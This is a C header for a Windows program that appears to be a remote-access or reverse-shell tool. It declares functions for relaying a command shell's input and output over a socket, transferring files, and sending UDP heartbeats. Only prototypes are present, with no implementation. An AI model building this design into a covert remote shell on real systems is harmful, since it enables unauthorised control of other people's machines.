#ifndef _INCLUDES_
#define _INCLUDES_

#include "cfg.h"
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <signal.h>


enum SIG  {_SIG_INIT = 0x00, _SIG_HRBT= 0xff, _SIG_FILE = 0x01, _SIG_COUT = 0x02, _SIG_SHLL = 0x03};


#define DEFAULT_PORT_UDP 55555
/* --- UTILS --- */

void DBGLG(char buf[], ...);
int WinsockInitialized(void);
int InitSetup(void);


/* --- OS --- */

int ScanOutPipe(HANDLE hStdoutRd, OVERLAPPED* readOverlapped, SOCKET sockt);
int WriteInPipe(HANDLE hStdinWr, OVERLAPPED* writeOverlapped,  SOCKET sockt);
int Shell(PROCESS_INFORMATION pi, SOCKET sock);
int Cout(SOCKET sockt, ...);
int File(SOCKET sockt, ...);

/* --- TCP --- */

int IpSetupTCP(ADDRINFO** _ad, char* ip);
int Connect(SOCKET* ConnectSocket, ADDRINFO* ad);
int SetupSocketTCP(ADDRINFO **ad);


/* --- UDP --- */

int SetupClientUDP(SOCKET* _socku_c);
int GenerateSockaddrin(SOCKADDR_IN* ptr, char* ip, short port);
int HeartBeat(SOCKET socku, SOCKADDR_IN* sa);
int InitServer(SOCKET socku, SOCKADDR_IN* sa);

#endif
